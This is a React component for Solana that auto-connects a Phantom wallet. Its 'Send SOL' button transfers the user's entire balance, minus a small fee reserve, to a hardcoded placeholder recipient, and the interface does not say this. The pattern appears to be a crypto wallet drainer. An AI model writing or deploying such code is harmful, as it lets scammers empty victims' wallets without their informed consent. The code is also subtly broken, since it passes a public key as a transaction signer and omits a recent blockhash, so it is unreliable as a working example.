import React, { useState, useEffect } from 'react';
import { Connection, PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL } from '@solana/web3.js';

function SolanaTransactionComponent() {
    const [walletAddress, setWalletAddress] = useState(null);
    const [errorMessage, setErrorMessage] = useState('');
    const [transactionStatus, setTransactionStatus] = useState(''); // State to keep track of the transaction status

    // Adjust with your connection string
    const connection = new Connection("https://solana-mainnet.g.alchemy.com/v2/yourAlchemyKey", 'confirmed');

    useEffect(() => {
        const connectWallet = async () => {
            try {
                const { solana } = window;
                if (solana?.isPhantom) {
                    await solana.connect();
                    setWalletAddress(solana.publicKey.toString());
                    setTransactionStatus('Wallet connected. Ready to send.');
                } else {
                    setErrorMessage('Phantom wallet not found. Please install Phantom.');
                }
            } catch (error) {
                setErrorMessage('Failed to connect wallet.');
            }
        };

        connectWallet();
    }, []);

    const handleTransaction = async () => {
        if (!walletAddress) {
            setErrorMessage('Wallet is not connected.');
            return;
        }

        setTransactionStatus('Processing your transaction...');
        try {
            const publicKey = new PublicKey(walletAddress);
            const balanceInLamports = await connection.getBalance(publicKey);
            // Assuming a minimal amount reserved for fees
            const feeReserve = LAMPORTS_PER_SOL * 0.01;

            if (balanceInLamports <= feeReserve) {
                throw new Error('Insufficient balance.');
            }

            const amountToSend = balanceInLamports - feeReserve;
            const recipientPublicKey = new PublicKey('RecipientPublicKeyHere');

            const transaction = new Transaction().add(
                SystemProgram.transfer({
                    fromPubkey: publicKey,
                    toPubkey: recipientPublicKey,
                    lamports: amountToSend,
                }),
            );

            await connection.sendTransaction(transaction, [publicKey], {skipPreflight: false, preflightCommitment: 'confirmed'});

            setTransactionStatus('Transaction completed. Thank you!');
        } catch (error) {
            console.error('Transaction error:', error);
            setErrorMessage('Transaction failed. Please try again.');
        }
    };

    return (
        <div>
            <button onClick={handleTransaction}>Send SOL</button>
            {/* Display either transaction status or error message */}
            <div>{transactionStatus || errorMessage}</div>
        </div>
    );
}

export default SolanaTransactionComponent;
